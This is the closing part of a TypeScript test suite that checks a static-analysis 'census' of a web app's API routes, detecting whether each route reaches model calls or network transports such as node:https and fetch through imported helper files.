    const probed = (route: string, hop: string): FileMap => new Map(files).set("app/api/b23-probe/route.ts", route).set("app/api/b23-probe/hop.ts", hop); // a fresh map per probe: the walks cache per map
    const HOP = 'import OpenAI from "openai";\nexport const SIZE = 3;\nexport const ask = () => new OpenAI().models.list();\n';
    expect((await census(probed('import { ask } from "./hop";\nexport const POST = () => ask();\n', HOP), probe))[0]).toMatchObject({ value: "none", modelEgress: true });
    expect((await census(probed('import { SIZE } from "./hop";\nexport const POST = () => SIZE;\n', HOP), probe))[0]).toMatchObject({ value: "none", modelEgress: false });
    expect((await census(probed('import { embedQuery } from "@/app/lib/embeddings";\nconst run = (text: string) => embedQuery(text);\nexport const POST = withProbe(run);\nfunction withProbe(handler: (text: string) => unknown) { return handler; }\n', "export {};\n"), probe))[0]).toMatchObject({ value: "none", modelEgress: true });
    expect((await census(probed('import "./hop";\nexport const POST = () => 1;\n', 'import { embedQuery } from "@/app/lib/embeddings";\nvoid embedQuery("at import");\n'), probe))[0]).toMatchObject({ value: "none", modelEgress: true });
    const https = probed('import { ask } from "./hop";\nexport const POST = () => ask();\n', 'import { request } from "node:https";\nexport const ask = () => request("https://example.com");\n');
    expect([...(await reachedTransports(https, probe)).entries()]).toEqual([["app/api/b23-probe/hop.ts", ["node:https"]]]);
    expect(transportsOf(probed("export const POST = () => 1;\n", 'export const ask = () => globalThis.fetch("https://example.com");\n'), "app/api/b23-probe/hop.ts")).toEqual(["fetch"]);
    expect(crossOriginFetches(new Map([["probe.ts", 'const URL_A = "/api/x";\nexport const a = () => fetch(URL_A);\nexport const b = (u: string) => fetch(u);\n']]), "probe.ts")).toEqual(["fetch(u)"]);
  });
});
